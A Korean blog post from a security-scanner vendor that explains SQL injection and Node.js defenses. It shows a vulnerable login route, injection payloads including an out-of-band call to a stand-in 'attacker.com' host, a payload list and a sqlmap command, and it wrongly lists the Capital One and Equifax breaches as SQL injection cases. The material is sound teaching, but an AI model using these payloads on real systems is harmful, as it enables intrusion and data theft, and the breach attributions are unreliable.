---
title: "SQL Injection 공격 원리와 방어 방법"
description: "SQL Injection 공격이 무엇인지, 어떻게 작동하는지, 그리고 Node.js 애플리케이션에서 어떻게 방어할 수 있는지 완벽 가이드를 제공합니다."
date: "2025-01-17"
author: "VibeScan Security Team"
tags: ["SQL Injection", "데이터베이스 보안", "웹 보안", "Node.js"]
image: "/blog/sql-injection.png"
---

SQL Injection은 가장 오래되고 위험한 웹 애플리케이션 취약점 중 하나입니다. OWASP Top 10에서 지속적으로 상위권에 랭크되는 이 공격은 여전히 많은 웹사이트에서 발견되고 있습니다.

## SQL Injection이란?

SQL Injection은 공격자가 애플리케이션의 SQL 쿼리에 악의적인 SQL 코드를 삽입하여 데이터베이스를 조작하는 공격 기법입니다.

### 피해 사례
- **2023년 MOVEit 해킹**: SQL Injection을 통해 수백 개 기업의 데이터 유출
- **2019년 Capital One 사건**: 1억 명 이상의 고객 정보 유출
- **2017년 Equifax 해킹**: 1억 4천만 명의 개인정보 유출

## SQL Injection 공격 원리

### 기본 예제

로그인 폼이 다음과 같이 구현되어 있다고 가정해봅시다:

```javascript
// 취약한 코드
app.post('/login', async (req, res) => {
  const { username, password } = req.body;

  const query = `
    SELECT * FROM users
    WHERE username = '${username}'
    AND password = '${password}'
  `;

  const user = await db.query(query);

  if (user) {
    res.json({ success: true });
  } else {
    res.json({ success: false });
  }
});
```

### 공격 시나리오

공격자가 username에 다음과 같이 입력하면:
```
username: admin' OR '1'='1
password: anything
```

실제 실행되는 SQL 쿼리:
```sql
SELECT * FROM users
WHERE username = 'admin' OR '1'='1'
AND password = 'anything'
```

`'1'='1'`은 항상 참이므로 비밀번호 없이 로그인됩니다!

### Union-Based SQL Injection

더 위험한 공격 예시:
```
username: ' UNION SELECT username, password FROM users--
password: anything
```

실행되는 쿼리:
```sql
SELECT * FROM users
WHERE username = '' UNION SELECT username, password FROM users--'
AND password = 'anything'
```

이를 통해 모든 사용자의 정보를 탈취할 수 있습니다.

## SQL Injection 유형

### 1. In-band SQL Injection (직접 공격)

가장 일반적인 형태로, 공격자가 동일한 채널에서 결과를 확인할 수 있습니다.

**Error-based:**
```sql
' AND 1=CONVERT(int, (SELECT @@version))--
```

**Union-based:**
```sql
' UNION SELECT null, username, password FROM users--
```

### 2. Blind SQL Injection (블라인드 공격)

서버 응답이 제한적일 때 사용됩니다.

**Boolean-based:**
```sql
' AND 1=1-- (True 응답)
' AND 1=2-- (False 응답)
```

**Time-based:**
```sql
'; WAITFOR DELAY '00:00:05'--
```

### 3. Out-of-band SQL Injection

DNS 또는 HTTP 요청을 통해 데이터를 빼내는 방식입니다.

```sql
'; EXEC xp_dirtree '\\attacker.com\share'--
```

## Node.js에서 SQL Injection 방어 방법

### 1. Prepared Statements (가장 권장)

#### MySQL (mysql2 패키지)
```javascript
const mysql = require('mysql2/promise');

const pool = mysql.createPool({
  host: 'localhost',
  user: 'root',
  database: 'mydb',
  waitForConnections: true,
  connectionLimit: 10
});

// 안전한 코드
app.post('/login', async (req, res) => {
  const { username, password } = req.body;

  try {
    const [rows] = await pool.execute(
      'SELECT * FROM users WHERE username = ? AND password = ?',
      [username, password]
    );

    if (rows.length > 0) {
      res.json({ success: true });
    } else {
      res.json({ success: false, message: '잘못된 인증 정보' });
    }
  } catch (error) {
    console.error(error);
    res.status(500).json({ error: '서버 오류' });
  }
});
```

#### PostgreSQL (pg 패키지)
```javascript
const { Pool } = require('pg');

const pool = new Pool({
  user: 'dbuser',
  host: 'localhost',
  database: 'mydb',
  password: 'password',
  port: 5432,
});

app.post('/login', async (req, res) => {
  const { username, password } = req.body;

  try {
    const result = await pool.query(
      'SELECT * FROM users WHERE username = $1 AND password = $2',
      [username, password]
    );

    if (result.rows.length > 0) {
      res.json({ success: true });
    } else {
      res.json({ success: false });
    }
  } catch (error) {
    console.error(error);
    res.status(500).json({ error: '서버 오류' });
  }
});
```

### 2. ORM 사용 (Sequelize)

ORM은 자동으로 Prepared Statements를 사용합니다.

```javascript
const { Sequelize, DataTypes } = require('sequelize');

const sequelize = new Sequelize('database', 'username', 'password', {
  host: 'localhost',
  dialect: 'mysql'
});

const User = sequelize.define('User', {
  username: {
    type: DataTypes.STRING,
    allowNull: false,
    unique: true
  },
  password: {
    type: DataTypes.STRING,
    allowNull: false
  }
});

app.post('/login', async (req, res) => {
  const { username, password } = req.body;

  try {
    const user = await User.findOne({
      where: {
        username: username,
        password: password // 실제로는 해시된 비밀번호 사용
      }
    });

    if (user) {
      res.json({ success: true });
    } else {
      res.json({ success: false });
    }
  } catch (error) {
    console.error(error);
    res.status(500).json({ error: '서버 오류' });
  }
});
```

### 3. TypeORM 사용 (TypeScript)

```typescript
import { Entity, PrimaryGeneratedColumn, Column, createConnection } from 'typeorm';
import { Request, Response } from 'express';

@Entity()
class User {
  @PrimaryGeneratedColumn()
  id: number;

  @Column()
  username: string;

  @Column()
  password: string;
}

async function login(req: Request, res: Response) {
  const { username, password } = req.body;

  const connection = await createConnection();
  const userRepository = connection.getRepository(User);

  try {
    const user = await userRepository.findOne({
      where: { username, password }
    });

    if (user) {
      res.json({ success: true });
    } else {
      res.json({ success: false });
    }
  } catch (error) {
    console.error(error);
    res.status(500).json({ error: '서버 오류' });
  }
}
```

### 4. 입력 검증 및 이스케이프

```javascript
const validator = require('validator');

app.post('/search', async (req, res) => {
  const { searchTerm } = req.body;

  // 입력 검증
  if (!validator.isAlphanumeric(searchTerm, 'en-US', { ignore: ' ' })) {
    return res.status(400).json({
      error: '검색어는 영문자와 숫자만 포함할 수 있습니다'
    });
  }

  // 길이 제한
  if (searchTerm.length > 50) {
    return res.status(400).json({
      error: '검색어는 50자를 초과할 수 없습니다'
    });
  }

  // Prepared Statement 사용
  const [results] = await pool.execute(
    'SELECT * FROM products WHERE name LIKE ?',
    [`%${searchTerm}%`]
  );

  res.json(results);
});
```

### 5. 화이트리스트 방식

```javascript
// 정렬 필드 화이트리스트
const allowedSortFields = ['name', 'price', 'created_at'];
const allowedSortOrders = ['ASC', 'DESC'];

app.get('/products', async (req, res) => {
  let { sortBy, order } = req.query;

  // 화이트리스트 검증
  if (!allowedSortFields.includes(sortBy)) {
    sortBy = 'created_at'; // 기본값
  }

  if (!allowedSortOrders.includes(order)) {
    order = 'DESC'; // 기본값
  }

  // ORDER BY에는 Prepared Statement를 사용할 수 없으므로
  // 화이트리스트로 검증한 값만 사용
  const query = `SELECT * FROM products ORDER BY ${sortBy} ${order}`;
  const [results] = await pool.query(query);

  res.json(results);
});
```

## 추가 보안 모범 사례

### 1. 최소 권한 원칙

데이터베이스 사용자에게 필요한 최소한의 권한만 부여합니다.

```sql
-- 읽기 전용 사용자 생성
CREATE USER 'readonly'@'localhost' IDENTIFIED BY 'password';
GRANT SELECT ON mydb.* TO 'readonly'@'localhost';

-- 애플리케이션 사용자 (INSERT, UPDATE, DELETE 가능하지만 DROP은 불가)
CREATE USER 'appuser'@'localhost' IDENTIFIED BY 'password';
GRANT SELECT, INSERT, UPDATE, DELETE ON mydb.* TO 'appuser'@'localhost';
```

### 2. 에러 메시지 숨김

```javascript
app.use((err, req, res, next) => {
  // 개발 환경에서만 상세 에러 표시
  if (process.env.NODE_ENV === 'development') {
    console.error(err.stack);
  }

  // 프로덕션에서는 일반적인 메시지만 표시
  res.status(500).json({
    error: '서버 오류가 발생했습니다'
  });
});
```

### 3. WAF (Web Application Firewall) 사용

```javascript
// Express용 SQL Injection 방어 미들웨어
const sqlInjectionProtection = (req, res, next) => {
  const sqlPattern = /(\b(SELECT|INSERT|UPDATE|DELETE|DROP|CREATE|ALTER|EXEC|EXECUTE|UNION|DECLARE)\b)|(-{2})|\/\*|\*\/|;/gi;

  const checkInput = (obj) => {
    for (let key in obj) {
      if (typeof obj[key] === 'string' && sqlPattern.test(obj[key])) {
        return true;
      }
      if (typeof obj[key] === 'object') {
        if (checkInput(obj[key])) return true;
      }
    }
    return false;
  };

  if (checkInput(req.body) || checkInput(req.query) || checkInput(req.params)) {
    return res.status(400).json({
      error: '잘못된 입력이 감지되었습니다'
    });
  }

  next();
};

app.use(sqlInjectionProtection);
```

### 4. Content Security Policy 설정

```javascript
const helmet = require('helmet');

app.use(helmet.contentSecurityPolicy({
  directives: {
    defaultSrc: ["'self'"],
    scriptSrc: ["'self'", "'unsafe-inline'"],
    styleSrc: ["'self'", "'unsafe-inline'"],
    imgSrc: ["'self'", "data:", "https:"],
  }
}));
```

## SQL Injection 테스트 방법

### 수동 테스트

기본 페이로드:
```
' OR '1'='1
' OR '1'='1'--
' OR '1'='1'/*
admin'--
admin' #
' UNION SELECT NULL--
' UNION SELECT NULL, NULL--
```

### 자동화 도구

1. **SQLMap**
```bash
sqlmap -u "http://example.com/login" --data="username=admin&password=test" --batch
```

2. **VibeScan**
VibeScan은 12,000+ 취약점 패턴에 SQL Injection 테스트가 포함되어 있습니다.

```bash
# VibeScan으로 전체 웹사이트 스캔
# https://vibescan.co.kr 에서 URL 입력만으로 자동 스캔
```

## 실전 체크리스트

개발 시 다음 항목을 확인하세요:

- [ ] 모든 데이터베이스 쿼리에 Prepared Statements 사용
- [ ] 사용자 입력값 검증 및 화이트리스트 방식 적용
- [ ] 에러 메시지에 DB 구조 정보 노출 방지
- [ ] 데이터베이스 사용자 권한 최소화
- [ ] ORM 사용 시 raw query 최소화
- [ ] 정기적인 보안 스캔 실시
- [ ] 코드 리뷰 시 SQL Injection 취약점 점검

## 결론

SQL Injection은 오래된 취약점이지만 여전히 위험합니다. 다행히 Prepared Statements와 ORM을 사용하면 대부분의 공격을 방어할 수 있습니다.

가장 중요한 것은:
1. **절대 사용자 입력을 신뢰하지 마세요**
2. **항상 Prepared Statements를 사용하세요**
3. **정기적으로 보안 스캔을 실시하세요**

VibeScan을 사용하면 SQL Injection을 포함한 12,000+ 취약점을 자동으로 검사할 수 있습니다. 지금 바로 [무료로 시작](https://vibescan.co.kr)해보세요!

---

**참고 자료:**
- [OWASP SQL Injection Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html)
- [PortSwigger SQL Injection Guide](https://portswigger.net/web-security/sql-injection)
